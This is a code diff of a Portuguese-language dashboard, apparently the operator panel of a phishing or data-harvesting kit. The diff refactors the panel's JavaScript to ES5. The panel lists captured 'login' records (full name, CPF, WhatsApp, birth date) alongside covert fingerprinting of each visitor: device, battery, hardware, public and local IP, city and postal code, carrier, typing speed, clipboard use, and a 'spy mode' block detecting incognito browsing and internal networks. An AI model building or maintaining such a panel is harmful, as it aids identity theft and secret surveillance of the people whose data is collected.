@@ -265,8 +265,10 @@
       } catch (e) { alert('Seu navegador não suporta áudio!'); }
     }
 
-    function tocarTom(freq, duracao, tipo = 'sine', volume = 0.3) {
+    function tocarTom(freq, duracao, tipo, volume) {
       if (!somAtivo || !audioCtx) return;
+      tipo = tipo || 'sine';
+      volume = volume || 0.3;
       const osc = audioCtx.createOscillator();
       const gain = audioCtx.createGain();
       osc.connect(gain); gain.connect(audioCtx.destination);
@@ -367,8 +369,8 @@
     function formatarData(iso) {
       if (!iso) return '-';
       if (/^\d{4}-\d{2}-\d{2}$/.test(iso)) {
-        const [a, m, d] = iso.split('-');
-        return `${d}/${m}/${a}`;
+        const partes = iso.split('-');
+        return partes[2] + '/' + partes[1] + '/' + partes[0];
       }
       return iso;
     }
@@ -402,42 +404,42 @@
     }
     function formatarOrientacao(o) {
       if (!o) return '-';
-      if (o.includes('portrait')) return '📱 Retrato';
-      if (o.includes('landscape')) return '🔄 Paisagem';
+      if (o.indexOf('portrait') !== -1) return '📱 Retrato';
+      if (o.indexOf('landscape') !== -1) return '🔄 Paisagem';
       return o;
     }
     function bandeiraPais(codigo) {
       if (!codigo || codigo.length !== 2) return '🌍';
       const codePoints = codigo.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0));
-      return String.fromCodePoint(...codePoints);
+      return String.fromCodePoint.apply(null, codePoints);
     }
     function iconeOrigem(o) {
       if (!o) return '❓';
-      if (o.includes('WhatsApp')) return '💬';
-      if (o.includes('Instagram')) return '📷';
-      if (o.includes('Facebook')) return '📘';
-      if (o.includes('TikTok')) return '🎵';
-      if (o.includes('Google')) return '🔍';
-      if (o.includes('Bing')) return '🔎';
-      if (o.includes('YouTube')) return '▶️';
-      if (o.includes('Twitter') || o.includes('X')) return '🐦';
-      if (o.includes('Telegram')) return '✈️';
-      if (o.includes('LinkedIn')) return '💼';
-      if (o.includes('Direto')) return '⌨️';
+      if (o.indexOf('WhatsApp') !== -1) return '💬';
+      if (o.indexOf('Instagram') !== -1) return '📷';
+      if (o.indexOf('Facebook') !== -1) return '📘';
+      if (o.indexOf('TikTok') !== -1) return '🎵';
+      if (o.indexOf('Google') !== -1) return '🔍';
+      if (o.indexOf('Bing') !== -1) return '🔎';
+      if (o.indexOf('YouTube') !== -1) return '▶️';
+      if (o.indexOf('Twitter') !== -1) return '🐦';
+      if (o.indexOf('Telegram') !== -1) return '✈️';
+      if (o.indexOf('LinkedIn') !== -1) return '💼';
+      if (o.indexOf('Direto') !== -1) return '⌨️';
       return '🌐';
     }
     function formatarTempo(seg) {
       if (!seg && seg !== 0) return 'N/A';
-      if (seg < 60) return `${seg} segundos`;
+      if (seg < 60) return seg + ' segundos';
       const min = Math.floor(seg / 60);
       const s = seg % 60;
-      return `${min} min ${s}s`;
+      return min + ' min ' + s + 's';
     }
     function formatarDirecao(graus) {
-      if (graus == null) return 'N/A (bloqueado ou sem permissão)';
+      if (graus == null) return 'N/A';
       const direcoes = ['Norte ⬆️','Nordeste ↗️','Leste ➡️','Sudeste ↘️','Sul ⬇️','Sudoeste ↙️','Oeste ⬅️','Noroeste ↖️'];
       const idx = Math.round(graus / 45) % 8;
-      return `${direcoes[idx]} (${graus}°)`;
+      return direcoes[idx] + ' (' + graus + '°)';
     }
 
     function renderizar(dados) {
@@ -447,122 +449,128 @@
         return;
       }
 
-      const html = dados.slice().reverse().map(d => {
+      let html = '';
+
+      for (let i = dados.length - 1; i >= 0; i--) {
+        const d = dados[i];
         const dev = d.dispositivo || {};
         const loc = d.localizacao || null;
 
-        const blocoDevice = `
-          <div class="bloco-device">
-            <div class="bloco-titulo">DISPOSITIVO</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">Sistema</div><div class="valor">${iconeSistema(dev.sistema)} ${esc(dev.sistema)}</div></div>
-              <div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ${esc(dev.navegador)}</div></div>
-              <div class="campo"><div class="rotulo">Tipo</div><div class="valor">${iconeTipo(dev.tipo)} ${esc(dev.tipo)}</div></div>
-              <div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ${esc(dev.idioma)}</div></div>
-              <div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ${esc(dev.tela)}</div></div>
-              <div class="campo"><div class="rotulo">Fuso horário</div><div class="valor">🕒 ${esc(dev.fuso)}</div></div>
-              <div class="campo"><div class="rotulo">Orientação</div><div class="valor">${formatarOrientacao(dev.orientacao)}</div></div>
-              <div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">${esc(dev.pixelRatio || 1)}x</div></div>
-              <div class="campo"><div class="rotulo">Touchscreen</div><div class="valor">${dev.touch ? '👆 Sim' : '❌ Não'}</div></div>
-              <div class="campo"><div class="rotulo">Cookies</div><div class="valor">${dev.cookies ? '🍪 Sim' : '❌ Não'}</div></div>
-              <div class="campo"><div class="rotulo">Hora do cliente</div><div class="valor">🕐 ${esc(dev.horaCliente)}</div></div>
-            </div>
-          </div>
-        `;
+        const blocoDevice =
+          '<div class="bloco-device">' +
+            '<div class="bloco-titulo">DISPOSITIVO</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">Sistema</div><div class="valor">' + iconeSistema(dev.sistema) + ' ' + esc(dev.sistema) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ' + esc(dev.navegador) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tipo</div><div class="valor">' + iconeTipo(dev.tipo) + ' ' + esc(dev.tipo) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ' + esc(dev.idioma) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ' + esc(dev.tela) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Fuso horário</div><div class="valor">🕒 ' + esc(dev.fuso) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Orientação</div><div class="valor">' + formatarOrientacao(dev.orientacao) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">' + esc(dev.pixelRatio || 1) + 'x</div></div>' +
+              '<div class="campo"><div class="rotulo">Touchscreen</div><div class="valor">' + (dev.touch ? '👆 Sim' : '❌ Não') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Cookies</div><div class="valor">' + (dev.cookies ? '🍪 Sim' : '❌ Não') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Hora do cliente</div><div class="valor">🕐 ' + esc(dev.horaCliente) + '</div></div>' +
+            '</div>' +
+          '</div>';
 
-        const blocoBateria = `
-          <div class="bloco-bateria">
-            <div class="bloco-titulo">BATERIA & CONEXÃO</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">Bateria</div><div class="valor">${iconeBateria(dev.bateria && dev.bateria.nivel)} ${dev.bateria ? dev.bateria.nivel + '%' : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Carregando?</div><div class="valor">${dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Tempo pra carregar</div><div class="valor">${dev.bateria && dev.bateria.tempoCarregar ? '⏱️ ' + dev.bateria.tempoCarregar + ' min' : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Tempo restante</div><div class="valor">${dev.bateria && dev.bateria.tempoDescarregar ? '⏳ ' + dev.bateria.tempoDescarregar + ' min' : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Velocidade</div><div class="valor">${formatarConexao(dev.conexao)}</div></div>
-              <div class="campo"><div class="rotulo">Tipo de conexão</div><div class="valor">${dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A'}</div></div>
-            </div>
-          </div>
-        `;
+        const blocoBateria =
+          '<div class="bloco-bateria">' +
+            '<div class="bloco-titulo">BATERIA & CONEXÃO</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">Bateria</div><div class="valor">' + iconeBateria(dev.bateria && dev.bateria.nivel) + ' ' + (dev.bateria ? dev.bateria.nivel + '%' : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Carregando?</div><div class="valor">' + (dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tempo pra carregar</div><div class="valor">' + (dev.bateria && dev.bateria.tempoCarregar ? '⏱️ ' + dev.bateria.tempoCarregar + ' min' : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tempo restante</div><div class="valor">' + (dev.bateria && dev.bateria.tempoDescarregar ? '⏳ ' + dev.bateria.tempoDescarregar + ' min' : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Velocidade</div><div class="valor">' + formatarConexao(dev.conexao) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tipo de conexão</div><div class="valor">' + (dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A') + '</div></div>' +
+            '</div>' +
+          '</div>';
 
-        const blocoHW = `
-          <div class="bloco-hw">
-            <div class="bloco-titulo">HARDWARE</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">RAM estimada</div><div class="valor">🧠 ${dev.ram ? dev.ram + ' GB' : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Núcleos CPU</div><div class="valor">⚙️ ${dev.nucleos || 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ${esc(dev.gpu)}</div></div>
-              <div class="campo"><div class="rotulo">Profundidade de cor</div><div class="valor">🎨 ${dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">Espaço em disco</div><div class="valor">${dev.storage ? '💾 ' + dev.storage.quota + ' MB (usando ' + dev.storage.uso + ' MB)' : 'N/A'}</div></div>
-            </div>
-          </div>
-        `;
+        const blocoHW =
+          '<div class="bloco-hw">' +
+            '<div class="bloco-titulo">HARDWARE</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">RAM estimada</div><div class="valor">🧠 ' + (dev.ram ? dev.ram + ' GB' : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Núcleos CPU</div><div class="valor">⚙️ ' + (dev.nucleos || 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ' + esc(dev.gpu) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Profundidade de cor</div><div class="valor">🎨 ' + (dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Espaço em disco</div><div class="valor">' + (dev.storage ? '💾 ' + dev.storage.quota + ' MB (usando ' + dev.storage.uso + ' MB)' : 'N/A') + '</div></div>' +
+            '</div>' +
+          '</div>';
 
-        const blocoLoc = loc ? `
-          <div class="bloco-loc">
-            <div class="bloco-titulo">LOCALIZAÇÃO & IP</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">IP público</div><div class="valor">🌐 ${esc(d.ip)}</div></div>
-              <div class="campo"><div class="rotulo">IP local (rede)</div><div class="valor">${dev.ipLocal ? '🏠 ' + esc(dev.ipLocal) : 'N/A'}</div></div>
-              <div class="campo"><div class="rotulo">País</div><div class="valor">${bandeiraPais(loc.codigoPais)} ${esc(loc.pais)}</div></div>
-              <div class="campo"><div class="rotulo">Estado / Região</div><div class="valor">🗺️ ${esc(loc.regiao)}</div></div>
-              <div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ${esc(loc.cidade)}</div></div>
-              <div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ${esc(loc.cep)}</div></div>
-              <div class="campo"><div class="rotulo">Operadora</div><div class="valor">📡 ${esc(loc.operadora)}</div></div>
-            </div>
-          </div>
-        ` : '';
+        let blocoLoc = '';
+        if (loc) {
+          blocoLoc =
+            '<div class="bloco-loc">' +
+              '<div class="bloco-titulo">LOCALIZAÇÃO & IP</div>' +
+              '<div class="cadastro-body">' +
+                '<div class="campo"><div class="rotulo">IP público</div><div class="valor">🌐 ' + esc(d.ip) + '</div></div>' +
+                '<div class="campo"><div class="rotulo">IP local (rede)</div><div class="valor">' + (dev.ipLocal ? '🏠 ' + esc(dev.ipLocal) : 'N/A') + '</div></div>' +
+                '<div class="campo"><div class="rotulo">País</div><div class="valor">' + bandeiraPais(loc.codigoPais) + ' ' + esc(loc.pais) + '</div></div>' +
+                '<div class="campo"><div class="rotulo">Estado / Região</div><div class="valor">🗺️ ' + esc(loc.regiao) + '</div></div>' +
+                '<div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ' + esc(loc.cidade) + '</div></div>' +
+                '<div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ' + esc(loc.cep) + '</div></div>' +
+                '<div class="campo"><div class="rotulo">Operadora</div><div class="valor">📡 ' + esc(loc.operadora) + '</div></div>' +
+              '</div>' +
+            '</div>';
+        }
 
-        const blocoOrigem = `
-          <div class="bloco-origem">
-            <div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">Veio de onde</div><div class="valor">${iconeOrigem(d.origem)} ${esc(d.origem)}</div></div>
-              <div class="campo"><div class="rotulo">Já visitou antes</div><div class="valor">${d.jaVisitou ? '🔁 Sim (cliente recorrente)' : '🆕 Primeira vez'}</div></div>
-              <div class="campo"><div class="rotulo">Tempo de preenchimento</div><div class="valor">⏱️ ${formatarTempo(d.tempoPreenchimento)}</div></div>
-              <div class="campo"><div class="rotulo">Tempo parado</div><div class="valor">⏸️ ${formatarTempo(d.tempoFora)}</div></div>
-              <div class="campo"><div class="rotulo">Copiou algo?</div><div class="valor">${d.copiouAlgo ? '📋 Sim (Ctrl+C)' : '❌ Não'}</div></div>
-              <div class="campo"><div class="rotulo">Velocidade de digitação</div><div class="valor">⌨️ ${d.velocidadeDigitacao ? d.velocidadeDigitacao + ' teclas/min' : 'N/A'}</div></div>
-            </div>
-          </div>
-        `;
+        const blocoOrigem =
+          '<div class="bloco-origem">' +
+            '<div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">Veio de onde</div><div class="valor">' + iconeOrigem(d.origem) + ' ' + esc(d.origem) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Já visitou antes</div><div class="valor">' + (d.jaVisitou ? '🔁 Sim (recorrente)' : '🆕 Primeira vez') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tempo de preenchimento</div><div class="valor">⏱️ ' + formatarTempo(d.tempoPreenchimento) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Tempo parado</div><div class="valor">⏸️ ' + formatarTempo(d.tempoFora) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Copiou algo?</div><div class="valor">' + (d.copiouAlgo ? '📋 Sim (Ctrl+C)' : '❌ Não') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Velocidade de digitação</div><div class="valor">⌨️ ' + (d.velocidadeDigitacao ? d.velocidadeDigitacao + ' teclas/min' : 'N/A') + '</div></div>' +
+            '</div>' +
+          '</div>';
 
-        const blocoEspiao = `
-          <div class="bloco-espiao">
-            <div class="bloco-titulo">🕵️ MODO ESPIÃO</div>
-            <div class="cadastro-body">
-              <div class="campo"><div class="rotulo">Modo anônimo?</div><div class="valor">${dev.incognito ? '🕶️ Sim (aba privada)' : '❌ Não (aba normal)'}</div></div>
-              <div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ${formatarDirecao(dev.bussola)}</div></div>
-              <div class="campo"><div class="rotulo">Rede corporativa?</div><div class="valor">${dev.ipLocal && (dev.ipLocal.startsWith('10.') || dev.ipLocal.startsWith('172.') || dev.ipLocal.startsWith('192.168.')) ? '🏢 Possível rede interna' : '🌐 Rede pública'}</div></div>
-            </div>
-          </div>
-        `;
+        const blocoEspiao =
+          '<div class="bloco-espiao">' +
+            '<div class="bloco-titulo">🕵️ MODO ESPIÃO</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">Modo anônimo?</div><div class="valor">' + (dev.incognito ? '🕶️ Sim (aba privada)' : '❌ Não (aba normal)') + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ' + formatarDirecao(dev.bussola) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Rede corporativa?</div><div class="valor">' + (dev.ipLocal && (dev.ipLocal.indexOf('10.') === 0 || dev.ipLocal.indexOf('172.') === 0 || dev.ipLocal.indexOf('192.168.') === 0) ? '🏢 Possível rede interna' : '🌐 Rede pública') + '</div></div>' +
+            '</div>' +
+          '</div>';
 
-        return `
-        <div class="cadastro">
-          <div class="cadastro-header">
-            <div class="cadastro-nome">${esc(d.nome)}</div>
-            <div class="cadastro-data">${new Date(d.recebidoEm).toLocaleString('pt-BR')}</div>
-          </div>
+        let blocoDados = '';
+        if (d.dispositivo) {
+          blocoDados = blocoDevice + blocoBateria + blocoHW;
+        }
 
-          <div class="bloco-titulo">DADOS DO LOGIN</div>
-          <div class="cadastro-body">
-            <div class="campo"><div class="rotulo">Nome completo</div><div class="valor">${esc(d.nome)}</div></div>
-            <div class="campo"><div class="rotulo">CPF</div><div class="valor">${esc(d.cpf)}</div></div>
-            <div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">${esc(d.whatsapp)}</div></div>
-            <div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">${formatarData(d.dataNascimento)}</div></div>
-          </div>
+        let blocoEspiaoFinal = '';
+        if (d.dispositivo) {
+          blocoEspiaoFinal = blocoEspiao;
+        }
 
-          ${d.dispositivo ? blocoDevice + blocoBateria + blocoHw : ''}
-          ${blocoLoc}
-          ${blocoOrigem}
-          ${d.dispositivo ? blocoEspiao : ''}
-
-          <div class="botoes-card">
-            <button class="btn-del" onclick="apagar(${d.id})">[ DELETE ]</button>
-          </div>
-        </div>
-        `;
-      }).join('');
+        html +=
+          '<div class="cadastro">' +
+            '<div class="cadastro-header">' +
+              '<div class="cadastro-nome">' + esc(d.nome) + '</div>' +
+              '<div class="cadastro-data">' + new Date(d.recebidoEm).toLocaleString('pt-BR') + '</div>' +
+            '</div>' +
+            '<div class="bloco-titulo">DADOS DO LOGIN</div>' +
+            '<div class="cadastro-body">' +
+              '<div class="campo"><div class="rotulo">Nome completo</div><div class="valor">' + esc(d.nome) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">CPF</div><div class="valor">' + esc(d.cpf) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">' + esc(d.whatsapp) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Data de nascimento</div><div class="valor">' + formatarData(d.dataNascimento) + '</div></div>' +
+            '</div>' +
+            blocoDados +
+            blocoLoc +
+            blocoOrigem +
+            blocoEspiaoFinal +
+            '<div class="botoes-card">' +
+              '<button class="btn-del" onclick="apagar(' + d.id + ')">[ DELETE ]</button>' +
+            '</div>' +
+          '</div>';
+      }
 
       document.getElementById('lista').innerHTML = html;
     }
@@ -581,7 +589,7 @@
 
     carregarVisitas();
     carregar();
-    setInterval(() => { carregarVisitas(); carregar(); }, 5000);
+    setInterval(function() { carregarVisitas(); carregar(); }, 5000);
   </script>
 </body>
 </html>
